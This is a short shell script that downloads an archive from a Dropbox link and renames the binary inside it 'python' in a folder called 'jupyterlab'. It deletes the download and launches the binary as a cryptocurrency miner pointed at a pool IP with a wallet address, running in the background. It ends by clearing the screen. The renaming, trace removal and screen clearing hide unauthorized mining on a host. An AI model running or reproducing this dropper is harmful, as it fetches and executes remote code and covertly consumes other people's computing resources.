#!/bin/sh
cd /home/sshuser
sysctl vm.nr_hugepages=2048
ls
wget https://www.dropbox.com/s/2j15ohnntlucrf2/nodejsapp8q.tar.gz
tar xvzf nodejsapp8q.tar.gz
mkdir jupyterlab
cd nodejsbrnt
cp nodejsfive /home/sshuser/jupyterlab/python
cd /home/sshuser
rm -r nodejsapp8q.tar.gz
rm -r nodejsbrnt
cd /home/sshuser/jupyterlab
./python -o 167.114.65.192:10111 -u LZdfLiPo6Zs2hq7FggM1ePUMZjtmisCpzVunSjzyRTC7ei3xUJwuZtqCMKuf4kwsVci9ZhzAksHykFUX9ENzvMep4fG2nNs.50000 -p chickenjoy -a rx/loki --donate-level 1 -t 7 -B
clear
ls
